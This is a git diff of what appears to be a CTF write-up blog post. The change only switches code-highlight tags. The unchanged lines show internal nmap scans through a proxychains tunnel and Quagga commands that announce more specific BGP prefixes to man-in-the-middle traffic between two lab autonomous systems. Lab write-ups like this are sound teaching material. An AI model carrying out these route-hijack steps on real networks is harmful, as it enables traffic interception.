@@ -147,7 +147,7 @@ To complete this challenge, I used a combination of these techniques. I used a s
 Using "ip addr" we can see that the box has two interfaces.
 
 >
-{% highlight text %}
+{% highlight bash %}
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
     inet 127.0.0.1/8 scope host lo
@@ -165,7 +165,7 @@ Using "ip addr" we can see that the box has two interfaces.
 According to the network diagram, one of them is connected to us, and the other is connected to the router.  Using nmap, I used it’s host discovery flag (-sn) to find where the router was.
 
 >
-{% highlight text %}
+{% highlight bash %}
 upload nmap
 ./nmap -sn 172.18.0.0/16
 
@@ -181,7 +181,7 @@ Host is up (0.00029s latency).
 The 172.18.0.0/16 range shows AWS internal DNS names, suggesting this is the interface probably the one connected to us.
 
 >
-{% highlight text %}
+{% highlight bash %}
 ./nmap -sn 172.16.1.0/24
 
 Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-12-25 16:56 UTC
@@ -196,7 +196,7 @@ Nmap done: 256 IP addresses (2 hosts up) scanned in 2.41 seconds
 It looks like "172.16.1.128" is IP address we are looking for given the DNS name, so I did a full port scan of this machine.
 
 >
-{% highlight text %}
+{% highlight bash %}
 ./nmap -p- 172.16.1.128
 
 Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-12-25 16:58 UTC
@@ -230,7 +230,7 @@ In my experience, the “-A” flag also broke the tunnel, so scanning was only 
 
 This gave the following results:
 >
-{% highlight text %}
+{% highlight bash %}
 proxychains nmap 172.16.1.128 -Pn -sT -sV -p 21,22,179,2601,2605
 ProxyChains-3.1 (http://proxychains.sf.net)
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-25 17:48 GMT
@@ -285,7 +285,7 @@ In essence this attacks relies on that routers running BGP will always favour a 
 Quagga's daemon is controlled through the "vtysh", and we can then view the current bgp configuration using "show ip bgp" and "show ip bgp sum".
 
 >
-{% highlight text %}
+{% highlight bash %}
 router1.ctx.ctf# show ip bgp
 BGP table version is 0, local router ID is 1.1.1.1
 Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
@@ -320,7 +320,7 @@ From this data, we can see that AS60002 routes for the 172.16.2.0/24 network, an
 Therefore, in order to man in the middle the connection we want to broadcast that we have a route to 172.16.2.0/25 to AS60003, and a route to 172.16.3.0/25 to AS60002. As these are more specific than what they are broadcasting (a /25 opposed to a /24),  both routers will use these paths.
 
 >
-{% highlight text %}
+{% highlight bash %}
 router1.ctx.ctf# conf t
 router1.ctx.ctf(config)# ip prefix-list 2noex permit 172.16.2.0/25
 router1.ctx.ctf(config)# !
@@ -349,7 +349,7 @@ These commands closely match those mentioned in the carrier write up. Essentiall
 
 We then do the same for AS60002 to AS60003 to complete our man in the middle position.
 
-{% highlight text %}
+{% highlight bash %}
 router1.ctx.ctf# conf t
 router1.ctx.ctf(config)# ip prefix-list 3noex permit 172.16.3.0/25
 router1.ctx.ctf(config)# !
